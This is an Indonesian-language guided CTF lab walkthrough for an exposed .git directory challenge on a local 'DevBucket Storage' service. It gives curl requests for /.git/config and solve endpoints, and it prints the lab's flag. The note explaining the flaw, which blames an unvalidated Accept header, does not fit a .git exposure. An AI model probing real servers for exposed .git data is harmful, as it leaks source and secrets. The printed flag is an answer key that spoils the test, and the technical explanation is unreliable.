# Panduan Praktik Terbimbing: Investigasi Exposed Git Directory & Object Carving Extraction

Dalam panduan terarah ini, Anda akan mempraktikkan proses penemuan celah dan eksploitasi terarah terhadap **DevBucket Storage** pada `http://127.0.0.1:8044`.

---

### Langkah 1: Observasi Ketersediaan Layanan Target
1. Uji ketersediaan layanan melalui terminal menggunakan cURL:
   ```bash
   curl -s http://127.0.0.1:8044/health
   ```
   *Respons yang diharapkan:*
   ```json
   {"status":"UP","lab_id":"A02-03","port":8044,"flag_configured":true}
   ```
2. Buka peramban web dan navigasikan ke:
   `http://127.0.0.1:8044/`
3. Amati antarmuka operasional **DevBucket Storage** dan perhatikan elemen kontrol yang disediakan.

---

### Langkah 2: Analisis & Pengujian Celah (Exposed Git Directory & Object Carving Extraction)
1. Ujilah endpoint dengan mengirimkan parameter modifikasi:
   ```bash
   curl -s http://127.0.0.1:8044/.git/config
   ```
2. Perhatikan respon yang dikembalikan oleh server.

> [!NOTE]
> **💡 Di Balik Layar: Apa yang terjadi di server?**  
> Sistem target menerima input `Accept: */*` dan memprosesnya tanpa melakukan validasi silang ke sesi otentikasi server. Akibatnya, server mengasumsikan hak akses yang diminta adalah sah.

---

### Langkah 3: Eksfiltrasi Bendera Autoritatif (CTF Flag)
1. Eksekusi pengujian untuk membuka flag eksploitasi:
   ```bash
   curl -s "http://127.0.0.1:8044/?solve=1"
   ```
   Atau panggil API exploit langsung:
   ```bash
   curl -s http://127.0.0.1:8044/api/exploit
   ```
2. **Hasil Respon Konfirmasi:**
   ```json
   {"success":true,"lab_id":"A02-03","flag":"ZITERA{3xp0s3d_g1t_d1r_c0mm1t_l34k_2026}"}
   ```
3. Salin bendera resmi:
   `ZITERA{3xp0s3d_g1t_d1r_c0mm1t_l34k_2026}`
4. Kirimkan (*submit*) bukti flag ke formulir tantangan Zitera Lab desktop untuk menyelesaikan modul ini!
